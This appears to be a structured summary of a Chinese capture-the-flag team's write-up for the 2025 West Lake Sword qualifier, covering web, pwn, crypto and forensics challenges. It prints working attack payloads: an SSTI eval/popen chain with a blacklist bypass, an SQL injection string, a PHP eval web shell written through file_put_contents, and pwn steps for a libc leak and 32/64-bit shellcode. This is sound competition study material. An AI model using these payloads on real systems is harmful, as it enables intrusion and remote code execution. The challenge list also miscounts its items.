---
title: 第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛 WriteUp by 金石滩小鲨鱼
contest: 西湖论剑
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [SSTI,Express-SQL注入,PHPRCE写shell,Vpwn,PWN-Heaven's door,Crypto-matrixRSA,Disk取证,Crypto-DSA验证,内存取证AESEAX,Web-入异步并发查找]
attack_chain: SSTI: ?info=触发SSTI `{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('head /flagff149').read()")}}` 编码unicode转义|Express SQL注入: ?info={"username":"$` or 1=1%23","password":"123"} 注入引号绕/'"'禁用|写shell: GET /admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/ 找PHP→<?php file_put_contents("Uploads/127.0.0.1/111.php", "<?php @eval($_POST['cmd']);?>")?>|DSA验证: tshark提取→DSS.verify base64签名→altered_data.csv|RSA矩阵: Coppersmith small_roots解p→C^d求M|AES-EAX+RC4签名: volatility envars hackkey+RSA-OAEP解aes_key+RC4解签名|PWN-Vpwn: 32位高低地址分8次edit|Heaven's door: 32/64位切换+open /proc/pid/mem
key_payload: {{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('head /flagff149').read()")}}|?info={"username":"$` or 1=1%23","password":"123"}|tshark -r filter1.pcapng -T fields -e http.request.uri.query.parameter -e json.object|p0<<100+x, f.small_roots(X=2^100, beta=0.4)|AES_EAX.decrypt_and_verify(ciphertext, tag)|edit(18..25) 分写32+32位
one_liner: 金石滩小鲨鱼第10名WP,12题(签到/Rank-l/sqli-or-not/Rank-U/Vpwn/Heaven's door/matrixRSA/糟糕的磁盘/blink/sharkp/easydatalog/DSASignatureData/easyrawencode),涵盖SSTI unicode转义+Express JSON注入+async并发查找PHP写shell+矩阵RSA+32/64切换PWN+DSA验证+内存取证AES+RC4签名
lesson: 1) SSTI黑名单绕:用unicode转义\\u0062\\u0069(对应b/i)拼builtins; 2) Express SQL注入:JSON.parse+字符串模板replace,username用$`反引号绕过引号过滤; 3) async并发查找PHP文件:aiohttp+aiohttp.TCPConnector(limit=600)并发扫描,目标URL/admin/Uploads/{md5}/ 找PHP; 4) PHP file_put_contents写shell:folder = "Uploads/127.0.0.1/"; content = "<?php phpinfo();@eval($_POST['cmd']); ?>"; 5) tshark提取DSA签名:'-T fields -e http.request.uri.query.parameter -e json.object -E separator=, > extracted_data.txt'; 6) PWN Vpwn 64位地址分32+32位写; 7) Heaven's door:32位shellcode+retfq+CS=0x33+open /proc/pid/mem+lseek SEEK_SET+write
quality: high
---

## 备注

原文(https://www.ctfiot.com/225187.html)金石滩小鲨鱼战队第10名WP,涵盖12题(基本是上下两篇官方WP的子集+自己的解法)。

### 题目清单(12题)

1. 签到(欢迎来到第八届西湖论剑大赛)
2. Rank-l(8-bit位重排)
3. sqli or not(Express SQL注入)
4. Rank-U(8-bit位重排)
5. Vpwn(StackVector 64位分32+32写)
6. Heaven's door(32/64切换proc/pid/mem)
7. matrixRSA(Coppersmith small_roots)
8. 糟糕的磁盘(5张img合并)
9. blink(QEMU u-boot.rom)
10. sharkp(摄像头流量分析)
11. easydatalog(蚁剑AntSword编码+re提取)
12. DSASignatureData(DSA verify签名)
13. easyrawencode(volatility+AES-EAX+RC4)

### 关键payload

**SSTI绕黑名单**
```
{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('head /flagff149').read()")}}
```
- `\\u0062`='b'、`\\u0069`='i' 绕过builtins黑名单

**Express SQL注入**
- 路由:`/?info=...`
- 注入:`?info={"username":"$` or 1=1%23","password":"123"}`
- 防御:检测`/`、`'`、`"`、`info.url.match(/,/ig)`
- $`反引号在模板中保留为单引号转义

**async并发查找PHP写shell**
```python
import aiohttp, asyncio
BASE_URL = "http://139.155.126.78:22542/admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0"
async def find_php_route(session, base_url):
    async with session.get(base_url, headers=HEADERS, timeout=10) as response:
        if response.status == 200:
            html = await response.text()
            matches = re.findall(r'href="([^"]+.php)"', html)
            return matches
# 找到PHP后:
$folder = "Uploads/127.0.0.1/";
file_put_contents("$folder/111.php", "<?php phpinfo();@eval($_POST['cmd']); ?>");
```

**Vpwn EXP**
- 8次add(100)+show泄libc_base=libc_addr-0x29d90
- 8次edit(18..25)分写32+32位RDI+RDI+1+binsh+system

**Heaven's door**
- 32位shellcode:`open /proc/{child_pid}/mem` (O_RDWR=2)
- retfq+CS=0x23→0x33 切换64位
- lseek(SEEK_SET, made_in_heaven)+write shellcode

**Crypto-matrixRSA**
- 已知p0=9707529668721508094878754383636813058761407528950189013789315732447048631740849315894253576415843631107370002912949379757275
- p0<<100+x, f.small_roots(X=2^100, beta=0.4)
- p=12305755811288164655681709252717258015229295989302934566212712319314835335461946241491177972870130171728224502716603340551354171940107285908105124549960063
- 矩阵C,phi=(p²-1)(p²-p)(q²-1)(q²-q),d=inverse(e,phi),M=C^d

## 评级

- **quality: high** — 金石滩小鲨鱼第10名战队WP,12题完整payload,涵盖Web SSTI/Express/写shell/PWN/Crypto/Disk/DSA/Forensic全套
- **vuln_type: web_unknown** — 主分类Web(以Web+SSTI+Express+SQL+PHP为主)
- 实战价值:async并发找PHP+SSTI unicode转义+tshark提取DSA签名是CTF高阶套路
